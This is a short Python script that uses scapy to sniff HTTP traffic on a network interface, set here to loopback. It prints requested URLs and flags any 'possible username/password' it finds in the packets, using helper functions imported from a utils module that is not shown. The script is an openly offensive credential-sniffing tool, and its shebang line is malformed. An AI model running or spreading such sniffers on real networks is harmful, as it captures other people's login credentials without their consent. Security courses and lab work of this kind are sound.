#/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

from utils.packet_sniffer_utils import sniff, get_url, get_login_info

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        get_url(packet)
        login_info = get_login_info(packet)
        if login_info:
            print("[+] Possible username/password >> " + login_info)

if __name__ == "__main__":
    sniff("lo", process_sniffed_packet)
